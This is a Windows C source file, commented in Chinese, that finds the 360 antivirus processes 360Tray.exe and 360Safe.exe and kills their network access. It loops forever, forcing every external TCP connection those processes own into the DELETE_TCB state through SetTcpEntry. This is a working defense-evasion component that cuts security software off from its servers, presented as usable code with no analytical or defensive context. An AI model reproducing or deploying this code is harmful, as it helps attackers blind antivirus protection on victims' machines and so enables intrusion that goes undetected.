#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define INET_ADDRSTRLEN 22
#define INET6_ADDRSTRLEN 65

// 根据进程名获取进程ID
DWORD GetProcessIdByName(const TCHAR* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot. Error: %lu\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_tcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    printf("Process %ws not found.\n", processName);
    return 0;
}

void DisconnectTcpConnection(DWORD targetPid) {
    PMIB_TCPTABLE2 tcpTable = NULL;
    DWORD tableSize = 0;
    DWORD retCode = GetTcpTable2(tcpTable, &tableSize, TRUE);

    if (retCode == ERROR_INSUFFICIENT_BUFFER) {
        tcpTable = (PMIB_TCPTABLE2)malloc(tableSize);
        retCode = GetTcpTable2(tcpTable, &tableSize, TRUE);
    }

    if (retCode == NO_ERROR) {
        for (DWORD i = 0; i < tcpTable->dwNumEntries; i++) {
            PMIB_TCPROW2 row = &tcpTable->table[i];

            // 检查远程地址是否为127.0.0.1或0.0.0.0
            if (row->dwRemoteAddr == htonl(INADDR_LOOPBACK) || row->dwRemoteAddr == htonl(INADDR_ANY)) {
                continue;
            }

            if (row->dwOwningPid == targetPid) {
                char localAddr[INET_ADDRSTRLEN];
                char remoteAddr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &row->dwLocalAddr, localAddr, INET_ADDRSTRLEN);
                inet_ntop(AF_INET, &row->dwRemoteAddr, remoteAddr, INET_ADDRSTRLEN);


                    // 设置状态为DELETE_TCB
                row->dwState = MIB_TCP_STATE_DELETE_TCB;
                DWORD setRetCode = SetTcpEntry((PMIB_TCPROW)row);
                if (setRetCode == NO_ERROR) {
                    //printf("Connection successfully terminated.\n");
                }
                else {
                    //printf("Failed to terminate connection. Error: %lu\n", setRetCode);
                }
            }
        }
    }
    else {
        //printf("Failed to get TCP table. Error: %lu\n", retCode);
    }

    if (tcpTable) {
        free(tcpTable);
    }
}

int NetKill() {
    const TCHAR* targetProcessName1 = _T("360Tray.exe"); // 替换为目标进程名
    const TCHAR* targetProcessName2 = _T("360Safe.exe"); // 替换为目标进程名
    DWORD targetPid1 = GetProcessIdByName(targetProcessName1);
    DWORD targetPid2 = GetProcessIdByName(targetProcessName2);
    while (TRUE) {

        DisconnectTcpConnection(targetPid1);
        DisconnectTcpConnection(targetPid2);
    }

    return 0;
}
